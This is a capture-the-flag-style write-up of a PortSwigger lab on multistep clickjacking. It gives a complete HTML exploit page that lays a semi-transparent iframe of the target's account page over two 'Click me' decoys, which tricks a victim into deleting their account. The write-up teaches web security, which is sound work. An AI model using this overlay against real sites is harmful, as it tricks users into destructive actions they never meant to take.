Attackers can manipulate a website by performing multiple actions.

#### Example - 
They might try to trick a user into making a purchase on a retail website. To do this, they may need to add items to a shopping cart before completing the order. Attackers can use techniques like dividing the webpage into sections or embedding other web content within it (iframes) to carry out these actions.

## Steps to solve lab -
### Title - Multistep clickjacking

**Desc** - This lab has some account functionality that is protected by a [CSRF](https://portswigger.net/web-security/csrf) token and also has a confirmation dialog to protect against [Clickjacking](https://portswigger.net/web-security/clickjacking). To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

**Creds** - wiener:peter

1. Log in to your account on the target website.
  ![[clickjacking2.png]]

2. Go to the exploit server and paste the following HTML template into the **Body** section:
```jsx
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<style>
	#target_website {
		position: relative;
		width: 800px;
		height: 850px;
		opacity: 0.5;
		z-index: 2;
		}
	#decoy_website1 {
		position: absolute;
		z-index: 1;
		top: 495px;
		left: 53px;
		}
	#decoy_website2 {
		position: absolute;
		z-index: 1;
		top: 290px;
		left: 213px;
		}
</style>
<body>
	<div id="decoy_website2">
		Click me next
	</div>
	<div id="decoy_website1">
	Click Me first
	</div>
	<iframe scrolling="no" id="target_website" src="https://0a5000c403efbd27809221760085002c.web-security-academy.net/my-account" >
	</iframe>	
</body>
</html>
```

4. Click **Store** and then **View exploit**.
5. Click on **Deliver exploit to victim** and the lab should be solved.
![[clickjacking23.png]]

![[clickjacking24.png]]

![[clickjacking25.png]]

